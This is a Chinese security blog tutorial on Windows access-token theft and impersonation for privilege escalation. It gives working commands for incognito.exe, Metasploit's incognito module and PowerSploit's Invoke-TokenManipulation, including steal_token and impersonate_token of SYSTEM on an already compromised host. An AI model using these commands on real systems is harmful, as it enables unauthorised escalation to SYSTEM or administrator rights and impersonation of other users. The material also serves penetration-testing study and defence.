**目录**

[令牌(Token)](#t0 "令牌(Token)")

[AccessToken的窃取与利用](#t1 "AccessToken的窃取与利用")

[1：程序 incognito.exe](#t2 "1：程序 incognito.exe")

[2：MSF下的incognito模块](#t3 "2：MSF下的incognito模块")

[3：Invoke-TokenManipulation.ps1脚本](#t4 "3：Invoke-TokenManipulation.ps1脚本")

[MSF实战假冒令牌提权](#t5 "MSF实战假冒令牌提权")

* * *

令牌(Token)
=========

**令牌(token)**是系统的临时秘钥，相当于账号和密码，用来决定是否允许这次请求和判断这次请求是属于哪一个用户的。它允许你在不提供密码或其他凭证的前提下，访问网络和系统资源，这些令牌将持续存在于系统中，除非系统重新启动。令牌最大的特点就是随机性，不可预测，黑客或软件无法猜测出令牌。

**假冒令牌**可以假冒一个网络中的另一个用户进行各类操作。所以当一个攻击者需要域管理员的操作权限时候，需要通过假冒域管理员的令牌进行攻击。

**令牌有很多种：**

*   访问令牌(Access Token)：表示访问控制操作主体的系统对象
    
*   会话令牌([Session](https://so.csdn.net/so/search?q=Session&spm=1001.2101.3001.7020) Token)：是交互会话中唯一的身份标识符。
    
*   密保令牌(Security Token)：又叫做认证令牌或硬件令牌，是一种计算机身份校验的物理设备，例如U盾
    

**Windows的AccessToken有两种类型**：

*   Delegation Token：授权令牌，它支持交互式会话登录(例如本地用户直接登录、远程桌面登录访问)
    
*   Impresonation Token：模拟令牌，它是非交互的会话(例如使用net use访问共享文件夹)。
    

**Access Token**(访问令牌)是用来描述进程或线程安全上下文的对象，令牌所包含的信息是与该用户账户相关的进程或线程的身份和权限信息。当用户登陆时，系统生成一个Access Token，然后以该用户身份运行的的所有进程都拥有该令牌的一个拷贝。这也就解释了A用户创建一个进程而B用户没有该进程的权限。

AccessToken的窃取与利用
-----------------

AccessToken的窃取与利用需要administrator管理员权限。

窃取AccessToken的数量：

incognito.exe程序 > InvokeTokenManipulat.ps1脚本 > MSF里的incognito模块

### 1：程序 incognito.exe

程序地址：[https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip](https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip "https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip")

AccessToken的列举(需要administrator权限)

```
incognito.exe list_tokens -u
```


![](https://img-blog.csdnimg.cn/20200113224615216.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

**模拟其他用户的令牌**

如果要使用AccessToken模拟其他用户，可以使用命令

```
incognito.exe execute -c "完整的Token名" cmd.exe      
例如：模拟system权限用户      
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
```


![](https://img-blog.csdnimg.cn/20200113224645697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 2：MSF下的incognito模块

需要administrator权限

```
use incognito #加载incognito      
list_tokens -u #列出AccessToken      
impersonate_token "NT AUTHORITY\SYSTEM" #模拟system用户，getsystem命令即实现了该命令。如果要模拟其他用户，将token名改为其他用户即可      
rev2self #返回到之前的AccessToken权限
```


![](https://img-blog.csdnimg.cn/20200113224812590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

### 3：Invoke-TokenManipulation.ps1脚本

这个脚本是PowerSploit下Exfiltration文件夹内的一个脚本

使用命令如下：

```
列举token      
Invoke-TokenManipulation -Enumerate      
提权至system      
Invoke-TokenManipulation -CreateProcess "cmd.exe" -Username "nt authoritysystem"      
复制进程token      
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ProcessId 500      
复制线程token      
Invoke-TokenManipulation -CreateProcess "cmd.exe" -ThreadId 500
```


![](https://img-blog.csdnimg.cn/20200113224945888.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

![](https://img-blog.csdnimg.cn/20200113224959312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

MSF实战假冒令牌提权
-----------

假设我们现在已经获得了目标主机的权限，但是通过 getsystem 和其他方式提权失败。

![](https://img-blog.csdnimg.cn/20200214162509493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

此时，我们可以尝试使用假冒令牌进行提权。

```
use incognito           #进入incognito模块      
list_tokens -u          #列出令牌
```


如图，可以看到有两种类型的令牌。

*   Delegation Token：也就是授权令牌，它支持交互式登录(例如可以通过远程桌面登录访问)
*   Impresonation Token：模拟令牌，它是非交互的会话。 

令牌的数据取决于当前获取权限的高低。

![](https://img-blog.csdnimg.cn/20200214163031417.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

当前列出了3个令牌。我们就可以通过下面的命令假冒 Administrator 用户了。

```
impersonate_token WIN2008\\adminstrator     #假冒WIN2008\adminstrator  的令牌      
impersonate_token WIN2008\\test             #假冒WIN2008\test          的令牌      
impersonate_token "NT AUTHORITY\SYSTEM"     #假冒System的令牌       
从进程窃取令牌      
steal_token 1252      
返回之前的token      
rev2self
```


![](https://img-blog.csdnimg.cn/20200214163620470.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM2MTE5MTky,size_16,color_FFFFFF,t_70)

参考文章：[渗透技巧——Token窃取与利用](http://mottoin.com/detail/1938.html "渗透技巧——Token窃取与利用")

 如果想跟我一起讨论的话，就快加入我的知识星球吧。星球里有一千多位同样爱好安全技术的小伙伴一起交流！[知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具](https://wx.zsxq.com/dweb2/index/group/88514121251242 "知识星球 | 深度连接铁杆粉丝，运营高品质社群，知识变现的工具")

![](https://img-blog.csdnimg.cn/1219ed79e9ed449d85d27b732cda5ea6.jpg)